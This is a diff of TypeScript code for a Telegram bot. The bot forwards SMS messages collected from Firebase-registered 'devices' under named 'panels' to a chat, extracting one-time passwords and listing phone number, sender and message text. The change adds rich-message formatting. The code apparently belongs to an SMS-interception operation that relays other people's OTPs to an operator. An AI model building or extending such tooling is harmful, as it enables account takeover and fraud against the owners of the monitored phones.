@@ -187,9 +187,22 @@ async function rawTelegramRequest(method: string, payload: Record<string, unknow
   return response.json() as Promise<{ ok: boolean; description?: string }>;
 }
 
-async function sendSmsLog(text: string): Promise<void> {
+async function sendSmsLog(text: string, richText?: string): Promise<void> {
   const chatId = await getSmsLogChatId();
   const bot = getBot();
+  if (richText) {
+    const richPayload = {
+      chat_id: chatId,
+      rich_message: { markdown: richText },
+      reply_markup: smsLogKeyboard(),
+    };
+    const richResult = await rawTelegramRequest("sendRichMessage", richPayload);
+    if (richResult.ok) return;
+    const richFallback = await rawTelegramRequest("sendRichMessage", stripPremiumButtonFields(richPayload));
+    if (richFallback.ok) return;
+    logger.warn({ description: richResult.description || richFallback.description }, "Rich SMS log failed, falling back to sendMessage");
+  }
+
   const payload = {
     chat_id: chatId,
     text,
@@ -408,23 +421,48 @@ function logTable(rows: Array<[string, string]>): string {
   return `<pre>${lines.join("\n")}</pre>`;
 }
 
-function formatSmsLog(panelName: string, device: FirebaseDevice, message: FirebaseSmsMessage): string {
+function richLogTable(rows: Array<[string, string, string]>): string {
+  const header = `| ${sct("DETAIL")} | ${sct("VALUE")} |`;
+  const rule = "| :--- | :--- |";
+  const body = rows.map(([emojiId, label, value]) =>
+    `| ${em(emojiId)} ${sct(label)} | ${escapeHtml(value).replace(/\|/g, "\\|")} |`
+  );
+  return [header, rule, ...body].join("\n");
+}
+
+function smsLogRows(panelName: string, device: FirebaseDevice, message: FirebaseSmsMessage): Array<[string, string, string]> {
   const otp = extractOtp(message.text);
   const phone = device.phoneNumber && device.phoneNumber !== "—" ? device.phoneNumber : "Unknown";
-  const rows: Array<[string, string]> = [
-    ["PANEL", panelName],
-    ["NUMBER", phone],
-    ["DEVICE", device.name || device.id],
-    ["SENDER", message.sender || "Unknown"],
+  const rows: Array<[string, string, string]> = [
+    [E.panel, "PANEL", panelName],
+    [E.phone, "NUMBER", phone],
+    [E.device, "DEVICE", device.name || device.id],
+    [E.profile, "SENDER", message.sender || "Unknown"],
   ];
-  if (otp) rows.push(["OTP", otp]);
-  rows.push(["TIME", message.time || "Live"], ["STATUS", "LIVE"]);
+  if (otp) rows.push([E.key, "OTP", otp]);
+  rows.push([E.timer, "TIME", message.time || "Live"], [E.online, "STATUS", "LIVE"]);
+  return rows;
+}
+
+function formatSmsLog(panelName: string, device: FirebaseDevice, message: FirebaseSmsMessage): string {
+  const rows = smsLogRows(panelName, device, message).map(([, label, value]) => [label, value] as [string, string]);
   return (
     `${em(E.sms)} <b>LIVE SMS RECEIVED</b>\n` +
     `${divider()}\n\n` +
     `${em(E.panel)} ${em(E.phone)} ${em(E.device)} ${em(E.key)}\n` +
     `${logTable(rows)}\n\n` +
     `${divider()}\n` +
+    `${em(E.note)} <b>MESSAGE</b>\n` +
+    `${escapeHtml(message.text).slice(0, 1200)}`
+  );
+}
+
+function formatSmsLogRich(panelName: string, device: FirebaseDevice, message: FirebaseSmsMessage): string {
+  return (
+    `${em(E.sms)} <b>LIVE SMS RECEIVED</b>\n\n` +
+    `${divider()}\n\n` +
+    `${richLogTable(smsLogRows(panelName, device, message))}\n\n` +
+    `${divider()}\n\n` +
     `${em(E.note)} <b>MESSAGE</b>\n` +
     `${escapeHtml(message.text).slice(0, 1200)}`
   );
@@ -472,7 +510,10 @@ async function collectPanelSmsLogs(panel: Panel): Promise<PendingSmsLog[]> {
 
 async function sendPendingSmsLog(entry: PendingSmsLog): Promise<void> {
   try {
-    await sendSmsLog(sc(formatSmsLog(entry.panelName, entry.device, entry.message)));
+    await sendSmsLog(
+      sc(formatSmsLog(entry.panelName, entry.device, entry.message)),
+      sc(formatSmsLogRich(entry.panelName, entry.device, entry.message)),
+    );
     await markSmsSent(entry.key);
   } catch (err) {
     releaseSmsReservation(entry.key);
